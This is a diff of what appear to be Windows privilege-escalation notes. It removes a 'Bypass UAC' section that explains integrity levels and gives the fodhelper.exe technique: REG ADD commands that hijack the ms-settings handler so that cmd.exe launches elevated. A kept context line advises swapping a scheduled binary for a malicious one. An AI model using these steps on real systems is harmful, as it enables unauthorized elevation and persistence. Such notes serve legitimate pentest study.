@@ -592,60 +592,6 @@ So we will examinate the Events System Sheduler directory: `C:\Program Files (x8
 
 Find some logs files to see which program is scheduled, and replace the binary with yout malicious one.
 
-# Bypass UAC
-
-User Account Control (UAC) is an access control system that forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access.
-
-## Mandatory Levels
-
-Exists three types of Mandatory Level:
-
-```
-whoami /all
-
-GROUP INFORMATION
------------------
-
-Group Name                          Type             SID          Attributes                                        
-=================================== ================ ============ ==================================================
-Everyone                            Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Desktop Users        Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                       Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE            Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users    Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization      Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-LOCAL                               Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication    Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Low Mandatory Level Unknown SID type S-1-16-4096  Mandatory group, Enabled by default, Enabled group
-```
-
-* **Low Mandatory Level:** Services like IE has no permissions, it can not write on any directory, but IE for example need to write cache on a directory. So with Low Mandatory Level we will only able to write data on the following path. `C:\Users\Victim\AppData\LocalLow`
-* **Medium Mandatory Level:** Permissions as a normal user.
-* **High Mandatory Level:** Permissions as NT AUTHORITY/SYSTEM.
-
-UAC can be bypassed in various ways.
-
-## fodhelper.exe
-
-`fodhelper.exe` is a Microsoft support application responsible for managing language changes in the operating system. This binary runs as `high integrity` on Windows 10.
-
-With `sigcheck.exe` from [SysInternals ](https://docs.microsoft.com/en-us/sysinternals/)is posible to inspect the application manifest.
-
-```
-sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
-```
-
-> **Note:** Search for `requestedExecutionLevel` as `requireAdministrator` and `autoElevate` in `true`.
-
-First we need to add some registries with REG:
-
-```
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
-REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
-```
-
-
 # References
 
 * [https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)
